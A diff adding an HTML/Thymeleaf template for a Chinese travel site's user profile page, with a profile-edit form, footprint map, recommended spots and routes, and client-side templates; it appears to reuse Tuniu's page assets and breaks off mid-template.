@@ -1,0 +1,1428 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8">
+    <title>云游旅行网_云南旅行社精品网站_云南旅游云南中青国际旅行社网站</title>
+
+    <meta name="description"
+          content="云游旅行网(yntravel.com)为云南中青国际旅行社旗下网站，提供云南旅游报价、云南自由行、昆明周边旅游、昆明出发国内游及出境游等旅游产品，云南旅行社网站首选！旅游咨询电话：400-633-5280"/>
+    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+    <link href="http://xnxw.cncnimg.cn/css/front/base.css" rel="stylesheet" type="text/css"/>
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1.css?v=0317" rel="stylesheet" type="text/css"/>
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1_color1.css?v=0317" rel="stylesheet" type="text/css"/>
+    <script src="../js/userUpdate.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<!--[if lt IE 8]>
+<script>var auto;</script>
+<![endif]-->
+
+<body style="background:#D5F2FA url(http://x1.cncnimg.cn/p10068/10/daf8.jpg) no-repeat center top">
+
+<div class="warpper">
+
+    <div id="site_nav">
+        <div class="site_nav_bd">
+            <div class="login"><em>欢迎来到记忆之旅 </em>
+            <div class="quick_menu">
+                <div class="top_ewm">
+                    <a class="mobile"><img src="http://x1.cncnimg.cn/p10068/10068_code.jpg"/></a>
+                </div>
+                <em>旅行社业务经营许可证 <a href="/about" target="_blank">L-YN-CJ00009</a></em>
+                <a href="/member/guester" rel="nofollow">订单查询</a>|
+                <a href="/pay_order" rel="nofollow">快捷支付</a>| <a href="javascript:;" onClick="addBookMark()"
+                                                                 rel="nofollow">加入收藏</a>|
+                <a href="/sitemap">网站导航</a>
+            </div>
+        </div>
+    </div>
+    <div class="header fn-clear">
+        <div class="top">
+            <div class="logo">
+                <p><a href="/"><img
+                        src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3556355933,3462953469&fm=26&gp=0.jpg"
+                        title="记忆之旅"/></a></p>
+            </div>
+            <div class="search">
+                <div class="search_con">
+                    <form action="/search" method="get"><input type="text" class="search_txt"
+                                                               placeholder="请输入目的地"/><input type="submit" value="搜索"
+                                                                                            class="search_sub"/></form>
+                </div>
+                <p>
+                    <em>热门搜索：</em>
+                    <a href="/search/%C0%F6%BD%AD">丽江</a>
+                    <a href="/search/%BD%CE%D7%D3%D1%A9%C9%BD">轿子雪山</a>
+                    <a href="/search/%D4%C3%B4%BB%B6%C8%BC%D9%BE%C6%B5%EA">悦椿度假酒店</a>
+                </p>
+            </div>
+            <div class="phone_top">
+                <p class="space_line"><i></i>预定热线</p>
+                <p><strong style="font-size:20px !important;">010-666666</strong></p>
+            </div>
+
+        </div>
+        <div class="nav_layer">
+            <div class="nav_layer_con">
+                <ul>
+                    <li class="on"><a  th:href="@{getHome.action?(deng=${user.deng})}"><span>首页<i class=""></i></span></a></li>
+                    <!--<li ><a href="/hotel"><span>度假酒店<i class="hot"></i></span></a></li>
+                     <li ><a href="/qianzheng"><span>签证<i ></i></span></a></li>-->
+                    <li><a href="/ticket"><span>门票<i></i></span></a></li>
+                    <li><a href="/line/zhoubianyou"><span>景点<i></i></span></a></li>
+                    <li><a href="/chujing"><span>旅游<i></i></span></a></li>
+                    <li><a href="/guonei"><span>目的地<i></i></span></a></li>
+                    <li><a href="/line/yunnantour"><span>攻略<i></i></span></a></li>
+                    <li><a href="/zt"><span>旅游专题<i></i></span></a></li>
+                    <li><a href="/HomePage/individualCommunity"><span>个人社区<i class="hot1"></i></span></a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="http://xnxw.cncnimg.cn/js/jquery1.10.2.min.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/front/base.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $('.J_ercode').mouseover(function () {
+                $(this).find('.J_code_img').show();
+            });
+            $('.J_ercode').mouseout(function () {
+                $(this).find('.J_code_img').hide();
+            });
+        });
+    </script>
+
+    <script type="text/javascript" src="http://xnxw.cncnimg.cn/js/index/index2.js"></script>
+    <style>
+        .nav_layer_con ul li a {
+            float: left;
+            height: 40px;
+            padding: 0 8px;
+            font-size: 14px;
+            color: #fff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .gg1000 {
+            _width: 100%;
+            background-color: #777;
+            background-repeat: no-repeat;
+            background-position: center top;
+            padding: 0;
+            position: relative;
+        }
+
+        .gg1000 a {
+            display: block;
+            margin: 0 auto;
+            width: 1000px;
+            background-repeat: no-repeat;
+            background-position: center top;
+            min-height: 40px;
+        }
+
+        .gg1000 img {
+            display: block;
+            _margin-left: -9000px;
+            left: -9000px;
+            position: relative;
+        }
+
+        .gg1000 i {
+            position: absolute;
+            background: url(/static/images/front/home30/close.gif) no-repeat;
+            right: 0px;
+            top: 0px;
+            cursor: pointer;
+            height: 40px;
+            width: 40px;
+            z-index: 10;
+            opacity: 0.6;
+            filter: alpha(opacity=60);
+        }
+
+        .gg1000 i:hover {
+            opacity: 1;
+            filter: alpha(opacity=100);
+        }
+
+        .tab_cont .pro_list {
+            display: none;
+        }
+
+        .tab_cont .showed {
+            display: block;
+        }
+
+        .tab_cont .showed {
+            background: url(/static/images/front/zoomloader.gif) no-repeat center center;
+        }
+    </style>
+    <div class="subnav_wrap_bg" id="subnav_wrap_bg"></div>
+    <input type="hidden" value="99" name="tabId"/>
+    <script type="text/javascript"> (function () {
+        var nav_tabs = document.getElementsByName("nav-tab");
+        var tabId = document.getElementsByName("tabId")[0].value;
+        if (nav_tabs.length && tabId.length) {
+            for (var i = 0; i < nav_tabs.length; i++) {
+                if (nav_tabs[i].getAttribute("data-tab") == tabId) {
+                    var class_str = nav_tabs[i].className;
+                    class_str += " selected";
+                    nav_tabs[i].className = class_str;
+                }
+            }
+        }
+    })();</script>
+    <script>$(document).ready(function () {
+        var catLoaded = false;
+        $(document).mousemove(function () {
+            if (!catLoaded) {
+                var getCookie = function (objName) {
+                    var arrStr = document.cookie.split("; ");
+                    for (var i = 0; i < arrStr.length; i++) {
+                        var temp = arrStr[i].split("=");
+                        if (temp[0] == objName) return unescape(temp[1]);
+                    }
+                    return false;
+                };
+                catLoaded = true;
+                var cityCode = '';
+                cityCode = getCookie("tuniuuser_citycode");
+                cityCode = base64decode(cityCode.toString());
+                $.getScript("//www.tuniu.com/headermenu/" + cityCode);
+            }
+        });
+    });</script>
+    <script type="text/javascript" src="//ssl3.tuniucdn.com/j/2014101501/common/index_base_v5.js"></script>
+</div> <!-- 横向导航菜单end --></div><!-- 头部end -->
+<script type="text/javascript">function selectTag(showContent, selfObj) {
+    var tag = document.getElementById("tags").getElementsByTagName("li");
+    var taglength = tag.length;
+    for (i = 0; i < taglength; i++) {
+        tag[i].className = "";
+    }
+    selfObj.parentNode.className = "selectTag";
+    for (i = 1; j = document.getElementById("tagContent" + i); i++) {
+        j.style.display = "none";
+    }
+    document.getElementById(showContent).style.display = "block";
+}
+function getCookie(objName) {
+    var arrStr = document.cookie.split("; ");
+    for (var i = 0; i < arrStr.length; i++) {
+        var temp = arrStr[i].split("=");
+        if (temp[0] == objName) return unescape(temp[1]);
+    }
+    return false;
+}
+var tuniuPPhoneDiv = document.getElementById("tuniu_400_num_phone");
+var tuniuPPhoneNumber = getCookie("p_phone_400");
+if (tuniuPPhoneDiv) {
+    if (tuniuPPhoneNumber) {
+        tuniuPPhoneDiv.innerHTML = tuniuPPhoneNumber;
+    } else {
+        tuniuPPhoneDiv.innerHTML = "4007-999-999";
+    }
+}
+$(function ($) {
+    var sub = $("#keyword-input-sub").val();
+    if (sub && sub != '') {
+        $("#keyword-input").val(sub);
+    }
+});</script>
+<link rel="stylesheet" href="http://img2.tuniucdn.com/f/201503181800/deyonUserCenter/css/tourUserCenter.css"
+      xmlns="http://www.w3.org/1999/html"/>
+<link rel="stylesheet" href="http://img2.tuniucdn.com/f/20150128125/deyonUserCenter/css/popup.css"/>
+<!--<link rel="stylesheet" href="http://www.tuniu_test.com/qask/qa_index3.css">
+<link rel="stylesheet" href="http://www.tuniu_test.com/css/reset.css">-->
+<link rel="stylesheet" href="http://img2.tuniucdn.com/s/201507071611/question_ask/qa_index.css">
+<link rel="stylesheet" href="http://img2.tuniucdn.com/s/201507071510/question_ask/reset.css">
+<link rel="stylesheet" type="text/css" href="http://img4.tuniucdn.com/s/2015121421/blogs/publish.css">
+<link rel="stylesheet" type="text/css" href="http://img4.tuniucdn.com/s/201505081010/blogs/travelnotes.css">
+<link rel="stylesheet" type="text/css"
+      href="http://img4.tuniucdn.com/s/20140409/user_center/user_center_travelnote.css"/>
+<link rel="stylesheet" type="text/css" href="http://img4.tuniucdn.com/s/20160615/guide/youji/myyouji.css">
+
+<script>
+    var page_uid = "49918211";
+    var page_user_unique_code = "D41487D5BC5EBF33F3AD117AE2361877";
+    var unique_code_flag = true;
+    var isIndex = true;
+    var self_flag = true;
+    var totalSpotAmount = 0;
+    var cityCount = 0;
+    var footprint_url = "http://www.tuniu.com/person/footprint/D41487D5BC5EBF33F3AD117AE2361877";
+</script>
+<style>
+    .offer_service {
+        margin-top: 0 !important;
+    }
+
+    .logo span {
+        float: left;
+        width: 163px;
+        height: 55px;
+        margin: 5px 0 0 0;
+    }
+</style>
+<!--main start-->
+<div class="tuc-warp clearfix"
+     style=" background: url(http://m.tuniucdn.com/filebroker/cdn/snc/03/1f/031fc9a344d81095db4d871aedf0fa03_w800_h0_c0_t0_w2048_h0_c0_t0.jpg) center top no-repeat #efefef;">
+    <div class="tuc-main clearfix">
+
+        <!-- 头部用户信息 start -->
+        <div class="tuc-user" th:each="user:${user}">
+            <div class="J-UserPic tuc-user-pic">
+                <!--<img src="" th:attr="src=${user.head}" width="160" height="160"/>-->
+                <<a href="javascript:;"><img
+                    th:attr="src=${user.head}"
+                    onerror="this.src='http://img2.tuniucdn.com/site/file/deyonUserCenter/images/empty.jpg'" 
+                    width="160" height="160" alt="头像"/></a>
+                <!-- <a href="https://i.tuniu.com/changepicture" target="_blank" id="btn_change_pic"><p class="pic-edit">
+                     修改图像</p></a>--></div>
+            <!-- 注释达人 <div class="tuc-user-right tuc-icon">-->
+            <div class="tuc-user-right">
+                <div class="tuc-num">
+                    <div class="tuc-num-top">
+                        <span>去过</span><span><em class="J-SumCountry">0</em>国家</span><span><em
+                            class="J-SumProvince">0</em>省份</span><span><em class="J-SumCity">0</em>城市</span><span><em
+                            class="J-SumSpot">0</em>景点</span>
+                    </div>
+                </div>
+                <div class="doyen-list-user" style="width:auto;">
+                    <p class="doyen-list-u-n">
+                        <span th:text="${user.username}"></span>
+                        <span class="tuc-grade tuc-icon">LV1</span>
+                    </p>
+                    <div class="tuc-deyon">
+                        <p class="tuc-deyon-c tuc-icon" id="cnt_like">0</p>
+                        <p class="tuc-deyon-s tuc-icon">36</p>
+                        <p class="tuc-deyon-d">常住地<span th:text="${user.address}" id="J_City" data-city="1615"
+                                                        data-province="1600"></span></p>
+                    </div>
+                    <p class="doyen-list-u-url" style="width:auto;">
+                    <p class="tuc-deyon-d">个性签名：<span th:text="${user.sign}"></span></p>
+                    <p class="doyen-list-u-url" style="width:auto;">
+                        <button type="button" th:value="${user.id}" onclick="toUpdate(this)"
+                                class="btn btn-default btn-xs" data-toggle="modal"
+                                data-target="#addModal" data-whatever="@mdo">编辑
+                        </button>
+                    </p>
+
+                </div>
+            </div>
+        </div>
+
+        <!--编辑个人资料 start-->
+        <div class="modal fade" id="addModal" tabindex="-1" role="dialog" aria-labelledby="insertModalLabel">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                                aria-hidden="true">&times;</span></button>
+                        <h4 class="modal-title" id="exampleModalLabel">编辑个人资料</h4>
+                    </div>
+                    <div class="modal-body">
+                        <form action="updateUser.action" method="post" enctype="multipart/form-data">
+                            <div class="form-group">
+                                <input type="hidden" name="id" class="form-control" id="id">
+                            </div>
+                            <div class="form-group">
+                                <input type="hidden" name="deng" class="form-control" id="deng">
+                            </div>
+                            <div class="form-group">
+                                <label for="username" class="control-label">昵称：</label>
+                                <input type="text" name="username" class="form-control" id="username">
+                                <span>必须是4-10个字符的英文或是2-5个字符的中文</span>
+                            </div>
+                            <div class="form-group">
+                                <label for="password1" class="control-label">原密码：</label>
+                                <input type="password" name="password1" class="form-control" id="password1"
+                                       onblur="originalPassword()">
+                                <span id="mess"></span>
+                            </div>
+                            <div class="form-group">
+                                <label for="password2" class="control-label">新密码：</label>
+                                <input type="password" name="password2" class="form-control" id="password2">
+                            </div>
+                            <div class="form-group">
+                                <label for="password" class="control-label">确定密码：</label>
+                                <input type="password" name="password" class="form-control" id="password"
+                                       onblur="determinePassword()">
+                                <span id="mess2"></span>
+                            </div>
+                            <div class="form-group">
+                                <label for="head" class="control-label">修改头像：</label>
+                                <input type="file" name="file" class="form-control" id="head">
+                            </div>
+                            <div class="form-group">
+                                <label for="address" class="control-label">常住地：</label>
+                                <input type="text" name="address" class="form-control" id="address">
+                            </div>
+                            <div class="form-group">
+                                <label for="sign" class="control-label">个性签名：</label>
+                                <input type="text" name="sign" class="form-control" id="sign">
+                                <span>不超过20字</span>
+                            </div> <!--onclick="updateUser()"-->
+                            <div class="modal-footer">
+                                <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+                                <button type="submit" class="btn btn-primary" id="updateButton">保存</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!--编辑个人资料 end-->
+
+        <!-- 头部用户信息 end -->
+
+        <div class="tuc-content clearfix">
+            <!--面包屑 start-->
+            <!--  -->
+            <input type="hidden" class="page_uid" value="49918211"/>
+            <input type="hidden" name="csrf_token" id="csrf_token" value="a0bd915b4ef95758391363eb15b4b0b6"/>
+            <div class="qa_nav" id="J_qa_nav">
+                <a href="/HomePage/individualCommunity" class="qa_nav_word"
+                   rel="nofollow" id="J_qa_nav_index">首页</a>
+                <a href="/HomePage/track" class="qa_nav_word"
+                   rel="nofollow" id="J_qa_nav_footpoint">足迹</a>
+                <a href="http://www.tuniu.com/person/ask/D41487D5BC5EBF33F3AD117AE2361877" class="qa_nav_word click"
+                   rel="nofollow" id="J_qa_nav_ask">问答</a>
+                <a href="http://www.tuniu.com/person/trips/D41487D5BC5EBF33F3AD117AE2361877" class="qa_nav_word click"
+                   rel="nofollow" id="J_qa_nav_trips">游记</a>
+            </div>
+
+            <!--面包屑 end-->
+
+            <div class="tuc-content-left">
+                <p class="tuc-content-title">
+                    <img class="tuc-footer tuc-icon"
+                         src="http://img2.tuniucdn.com/site/file/deyon/images/transparent.gif"/>
+                    <span>我的足迹</span>
+                    <a id="J_AddTrack" href="javascript:;" class="addtrack tuc-icon">添加足迹</a> <a
+                        href="javascript:void(0);" class="share tuc-icon" share_place="map">分享</a>
+                </p>
+                <div class="tuc-map" style="display:none;">
+                    <!-- 地图展示 S -->
+                    <div id="J_Map" class="map" style="width:740px;height:386px;"></div>
+                    <div id="J_MapSwitch" class="map-switch map-global"></div>
+                    <div class="tuc-ranking tuc-icon">
+                        <p class="tuc-rank-title">足迹排行榜</p>
+                        <p class="tuc-rank-num">4948</p>
+                    </div>
+                    <!-- 地图展示 E -->
+                </div>
+                <div class="tuc-track clearfix">
+                    <div class="tuc-track-left">
+                        <div class="J_tucNav tuc-track-nav">
+                            <a class="track-home track-down tuc-icon">国内</a>
+                            <div id="J_InnerList" style="display:none">
+                            </div>
+                            <a class="track-foreign track-down tuc-icon">境外</a>
+                            <div id="J_OuterList" style="display:none">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tuc-track-right" id="J_TrackWrap">
+                        <div class="tuc-area" id="chinaEare">
+                            <p class="tuc-track-title track-title-bordbot">
+                                <span data-value="1">国内</span>
+                            </p>
+                            <div id="J_China" class="china-all">
+                            </div>
+                        </div>
+
+                        <div class="tuc-area" id="foreignEare">
+                            <p class="tuc-track-title track-title-bordbot">
+                                <span data-value="2">境外</span>
+                            </p>
+                            <div id="J_Foreign" class="foreign-all">
+
+                            </div>
+                            <div class="area-line"><p></p><span class="tuc-icon"></span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 我的游记 start -->
+                <style>
+                    .pager_active {
+                        color: #f60;
+                    }
+                </style>
+                <div class="J-TucSTrips tuc-send-trips clearfix" id="part_trip" style="margin-bottom: 10px;">
+                    <p class="tuc-content-title">
+                        <img class="tuc-tour tuc-icon"
+                             src="http://img2.tuniucdn.com/site/file/deyon/images/transparent.gif"/>
+                        <span>我的旅途</span>
+                        <a href="/HomePage/travel" target="_blank" class="sendtrack tuc-icon">发表游记</a>
+                    </p>
+                    <div class="tuc-send-time tuc-icon" id="change_trip_year">
+                        <p class="tuc-all tuc-selected tuc-icon" trip_year="all">全部</p>
+                        <p class="tuc-all tuc-icon" trip_year="2015">2015</p>
+                        <p class="tuc-all tuc-icon" trip_year="2014">2014</p>
+                        <p class="tuc-all tuc-icon" trip_year="2013">2013</p>
+                        <p class="tuc-all tuc-icon" trip_year="2012">2012</p>
+                        <p class="tuc-more tuc-icon" trip_year="more"><span>更早之前</span></p>
+                        <p class="tuc-send-time-border"></p>
+                    </div>
+                    <!-- 游记列表 -->
+                </div>
+                <!-- 我的游记 end -->
+            </div>
+            <!-- 右侧边栏 start -->
+            <div class="tuc-content-right">
+                <!--我的想去模板 end-->
+                <!-- 我想去的景点 end -->
+
+                <!-- 推荐景点 start -->
+                <div class="tuc-list" id="tucRemmmond">
+                    <p class="tuc-content-title">
+                        <img class="tuc-want1 tuc-icon"
+                             src="http://img2.tuniucdn.com/site/file/deyon/images/transparent.gif"/>
+                        <span>我的推荐景点</span>
+                        <a href="javascript:;" class="add tuc-icon">添加</a>
+                        <a href="#" class="share tuc-icon" share_place="recommend_spot">分享</a>
+                    </p>
+                    <div class="tuc-list-want">
+                        <img src="http://img3.tuniucdn.com/site/file/deyonUserCenter/images/empty.png?v=20141208"
+                             width="104" height="103"/>
+                        <p>你还没有给大家推荐值得旅行的地方，<a href="#" id="tucNowRem">现在去推荐吧~</a></p>
+                    </div>
+                </div>
+                <!--添加推荐 start-->
+                <div class="hide" id="tuc6">
+                    <div class="tuc-want-place">
+                        <p class="place-title"><a href="javascript:;" class="add tuc-icon">点击此处选择你想要推荐的地方：</a></p>
+                    </div>
+
+                    <div class="place-show">
+                        <div class="place-input"></div>
+                        <div class="tuc1-add">
+                            <label>国内</label>
+                            <div class="tuc1-county tuc-icon" id="cplace">
+                                <div class="tuc1-select">江苏</div>
+                            </div>
+                        </div>
+                        <div class="tuc1-addforg">
+                            <label>境外</label>
+                            <div class="tuc1-county tuc-icon" id="fplace"></div>
+                            <!--<div class="tuc1-county tuc-icon tuc1-foreign" id="fcity"></div>-->
+                        </div>
+                        <div class="tuc1-areashow" id="placeShow">请选择一个地方</div>
+
+                        <div class="tuc1-spotp">
+                            <input type="text" value="" class="J-AddSearchInput tuc-spot-search "/>
+                            <span class="J-AddSearchBtn tuc-search tuc-icon"></span>
+                            <p class="place-title">点击选择你想要推荐的地方:</p>
+                            <div class="tuc1-spotshow" id="Spotplace"></div>
+                        </div>
+                    </div>
+                    <div class="tuc-nom-nominate">
+                        <span class="fl">推荐指数：</span>
+                        <p class="area-list-star">
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                        </p>
+                    </div>
+                    <div class="place-reason">
+                        <span class="fl">推荐理由：</span>
+                        <textarea class="place-textarea" name="palceReason" resize="no"></textarea>
+                    </div>
+                    <div class="tuc5-error">
+                        已超过800字符的上限。
+                    </div>
+                </div>
+                <!--添加推荐 start-->
+
+                <!--编辑推荐 start-->
+                <div class="hide" id="tuc7">
+                    <div class="tuc-want-place">
+                        <p class="place-title">编辑你想要推荐的地方推荐星级和推荐理由:</p>
+                        <div class="place-input"></div>
+                    </div>
+                    <div class="tuc-nom-nominate">
+                        <span>推荐指数：</span>
+                        <p class="area-list-star" data-star="" id="aaaa">
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                            <span class="starb tuc-icon"></span>
+                        </p>
+                    </div>
+                    <div class="place-reason">
+                        <span>推荐理由：</span>
+                        <textarea class="place-textarea" name="palceReason" resize="no"></textarea>
+                    </div>
+                    <div class="tuc5-error">
+                        已超过800字符的上限。
+                    </div>
+                </div>
+                <!--添加推荐 start-->
+
+                <!--我的推荐景点模板 start-->
+                <script id="T-TucRemmond" type="text/template">
+                    <!--<%for(i = 0 ;i< list.length; i++){%>-->
+                    <%if(i==0){%>
+                    <div class="tuc-nominate-item" id="groom<%=list[i].poi_id%>" data-code="<%=list[i].poi_id%>">
+                        <%}else{%>
+                        <div class="tuc-nominate-item-s" id="groom<%=list[i].poi_id%>" data-code="<%=list[i].poi_id%>">
+                            <%}%>
+                            <div class="tuc-nom-pic">
+                                <a href="<%=list[i].url%>" target="_blank"><img src="<%=list[i].imageUrl%>" width="240"
+                                                                                height="173" title="<%=list[i].name%>"
+                                                                                alt="<%=list[i].name%>"/></a>
+                            </div>
+                            <div class="tuc-nom-tag">
+                                <p class="tuc-nom-title"><a href="<%=list[i].url%>" target="_blank"
+                                                            title="<%=list[i].name%>"><%=list[i].name%></a></p>
+                                <div class="tuc-nom-nominate">
+                                    <span>推荐指数：</span>
+                                    <p class="tuc-nom-star " data-star="<%=list[i].user_rated-1%>">
+                                        <% for(k = 0 ;k< list[i].user_rated; k++){%>
+                                        <span class="starl tuc-icon"></span>
+                                        <%}%>
+                                        <% for(j = 0 ;j< 5-list[i].user_rated; j++){%>
+                                        <span class="starb tuc-icon"></span>
+                                        <%}%>
+                                    </p>
+                                </div>
+                                <p class="tuc-nom-reason"><span class="tuc-reason">推荐理由：</span><span
+                                        class="J-ReasonPop reason-title" data-name="<%=list[i].content%>"></span></p>
+                                <div class="tuc-nom-number">
+                                    <p class="tuc-nom-num"><%=list[i].been%>人也去过</p>
+                                    <%if(list[i].self){%>
+                                    <p class="tuc-nom-edit">
+                                        <span class="del tuc-icon" data-code="<%=list[i].poi_id%>"></span>
+                                        <span class="edit tuc-icon" data-code="<%=list[i].poi_id%>"></span>
+                                    </p>
+                                    <%}%>
+                                </div>
+                            </div>
+                        </div>
+                        <%}%>
+                </script>
+                <!--我的推荐景点模板 end-->
+
+                <!-- 推荐景点 end -->
+
+                <!-- 人气线路 | 我的推荐线路 start -->
+                <!--我的推荐线路 start-->
+                <div class="tuc-list" id="remRoute" data-code="1">
+                    <p class="tuc-content-title">
+                        <img class="tuc-want3 tuc-icon"
+                             src="http://img2.tuniucdn.com/site/file/deyon/images/transparent.gif"/>
+                        <span>我推荐的线路</span>
+                        <a href="javascript:;" class="add tuc-icon">添加</a>
+                        <a href="javascript:;" class="share tuc-icon" share_place="recommend_my_routes">分享</a>
+                    </p>
+                    <div class="tuc-list-want">
+                        <img src="http://img2.tuniucdn.com/site/file/deyonUserCenter/images/empty.png" width="104"
+                             height="103"/>
+                        <p>快快把你认为记忆网值得预订的线路，<a href="javascript:;" id="remToFriend">推荐给好友吧</a></p>
+                    </div>
+                </div>
+                <!--我的推荐线路 end-->
+
+                <!--添加我推荐的线路 start-->
+                <div class="hide" id="tuc8">
+                    <h4>快快把你认为记忆网值得预订的线路推荐给好友吧~</h4>
+                    <div class="product-error">请选择要推荐的线路</div>
+                </div>
+                <!--添加我推荐的线路 end-->
+
+
+                <!--人气路线模板 start-->
+                <script id="T-TucPop" type="text/template">
+                    <!-- <%for(i = 0 ;i< list.length; i++){%>-->
+                    <%if(i==0){%>
+                    <div class="tuc-pop-item">
+                        <%}else{%>
+                        <div class="tuc-pop-item-s">
+                            <%}%>
+                            <div class="tuc-pop-pic">
+                                <a href="<%=list[i].url%>" target="_blank"><img src="<%=list[i].img%>" width="240"
+                                                                                height="174" title="<%=list[i].name%>"
+                                                                                alt="<%=list[i].name%>"/></a>
+                            </div>
+                            <p class="tuc-pop-title">
+                                <a href="<%=list[i].url%>" target="_blank" title="<%=list[i].name%>">
+                                    <%=list[i].name%>
+                                </a>
+                            </p>
+                            <div class="tuc-pop-tag">
+                                <p class="tuc-pop-money">¥<span><%=list[i].price%></span>起</p>
+                                <p class="tuc-pop-sum"><%=list[i].num%>人已出游</p>
+                            </div>
+                            <p class="tuc-pop-bg"></p>
+                        </div>
+                        <%}%>
+                </script>
+                <!--人气路线模板 end-->
+
+                <!--我的推荐线路模板 start-->
+                <script id="T-TucRoute" type="text/template">
+                    <%if(list && list.length){%>
+                    <!--<%for(i = 0 ;i< list.length; i++){%>-->
+                    <%if(i==0){%>
+                    <div class="tuc-route-item">
+                        <%}else{%>
+                        <div class="tuc-route-item-s">
+                            <%}%>
+                            <div class="tuc-pop-pic">
+                                <a href="<%=list[i].url%>" target="_blank"><img src="<%=list[i].img%>" width="240"
+                                                                                height="174" title="<%=list[i].name%>"
+                                                                                alt="<%=list[i].name%>"/></a>
+                            </div>
+                            <p class="tuc-pop-title">
+                                <a href="<%=list[i].url%>" target="_blank" title="<%=list[i].name%>">
+                                    <%=list[i].name%>
+                                </a>
+                            </p>
+                            <div class="tuc-route-tag">
+                                <p class="tuc-pop-money">¥<span><%=list[i].price%></span>起</p>
+                                <p class="tuc-route-pag">
+                                    <% for(k = 0 ;k< list[i].tag.length; k++){%>
+                                    <%if(list[i].tag[k].pag==true) {%>
+                                    <span class="pag-select">
+                            <%=list[i].tag[k].text%>
+                        </span>
+                                    <%}%>
+                                    <%}%>
+                                </p>
+                                <div class="tuc-route-number">
+                                    <p class="tuc-route-num"><%=list[i].num%>人已出游</p>
+                                    <%if(list[i].self){%>
+                                    <p class="tuc-route-edit">
+                                        <span class="del tuc-icon" data-code="<%=list[i].id%>"></span>
+                                        <span class="edit tuc-icon" data-code="<%=list[i].id%>"></span>
+                                    </p>
+                                    <%}%>
+                                </div>
+                            </div>
+                            <p class="tuc-pop-bg"></p>
+                        </div>
+                        <%}%>
+                        <%}else{%>
+                        <div class="tuc-list-want">
+                            <img src="http://img2.tuniucdn.com/site/file/deyonUserCenter/images/empty.png" width="104"
+                                 height="103"/>
+                            <p>快快把你认为途牛网值得预订的线路，<a href="javascript:;" id="remToFriend">推荐给好友吧</a></p>
+                            <!--<p>这个家伙太懒，还没把他的私藏线路推荐给好友~</p>-->
+                        </div>
+                        <%}%>
+                </script>
+                <!--我的推荐线路模板 end-->
+
+                <!-- 人气线路 | 我的推荐线路 end -->
+            </div>
+        </div>
+        <!-- 右侧边栏 end -->
+
+    </div>
+    <!--main end-->
+
+    <div class="hide" id="tuc3">
+        <p class="changename">确定添加以上城市信息？</p>
+    </div>
+    <!--添加景点 start-->
+    <div id="tuc4" class="hide">
+        <div class="tuc-spot">
+            <input type="text" value="" class="tuc-spot-search "/>
+            <span class="tuc-search tuc-icon"></span>
+            <div class="tuc1-areashow" id="spotShow"></div>
+        </div>
+        <div class="spot-hasselected">
+            已选择了<span>2</span>个城市
+        </div>
+    </div>
+    <!--添加景点 end-->
+    <!--编辑景点 start-->
+    <div class="hide" id="tuc5">
+        <div class="tuc5-title">
+            <p class="area-list-star">
+                <span class="starl tuc-icon"></span>
+                <span class="starl tuc-icon"></span>
+                <span class="starl tuc-icon"></span>
+                <span class="starl tuc-icon"></span>
+                <span class="starb tuc-icon"></span>
+            </p>
+            <span class="title">title</span>
+        </div>
+        <textarea name="commentspot" class="comment-spot"></textarea>
+        <div class="tuc5-error">
+            已超过800字符的上限。
+        </div>
+    </div>
+    <!--编辑景点 end-->
+
+    <!--洲省份模板-->
+    <script type="text/template" id="T_Area">
+        <div class="tuc-area-province">
+            <div class="tuc-area-province-tit clearfix">
+                <i></i><span data-value="<%= id %>"><%= name %></span>
+            </div>
+            <div class="J_Cities">
+            </div>
+        </div>
+    </script>
+
+    <!--国家城市模板-->
+    <script type="text/template" id="T_Addr">
+        <div class="J_City paBottom list-second">
+            <div class="tuc-area-title">
+                <img src="http://img2.tuniucdn.com/site/file/deyon/images/transparent.gif" class="area-icon tuc-icon">
+                <div class="area-details">
+                    <p class="area-name"><%= name %></p>
+                    <p class="J_AddrDelete area-del tuc-icon"></p></div>
+                <div class="area-details">
+                    <p class="J-SumComment area-details-left"><em class="J-CountSpot"><% if(spots){%><%= spots %><%
+                        }else{ %>0<% } %></em>个景点,<em class="J-CountComment"><% if(reviews){%><%= reviews %><% }else{
+                        %>0<% } %></em>条点评</p>
+                    <a data-value="china101" href="javascript:;"
+                       class="J_AddSpot area-details-right tuc-icon">继续添加景点</a></div>
+            </div>
+            <div class="J_Spots spot-line">
+                <div class="J_Fold spot-fold" data-code="1">展开<em class="tn_fontface">&#xe61f;</em></div>
+            </div>
+            <p class="cricle-spot tuc-icon"></p>
+        </div>
+    </script>
+
+    <!--景点模板-->
+    <script type="text/template" id="T_Spot">
+        <div data-code="10002" class="area-list tuc-icon spot-position">
+            <div class="area-list-img">
+                <a target="_blank" href=" <%= info.url %>"><img width="270" height="147" alt="" title=""
+                                                                src="<%= info.img %>"></a>
+            </div>
+            <div class="area-list-text">
+                <p class="area-list-name">
+                    <span class="name"><a target="_blank" href="<%= info.url %>"><%= name %></a></span>
+                    <span data-sid="china" data-code="10002" class="J_SpotDelete colse tuc-icon"></span></p>
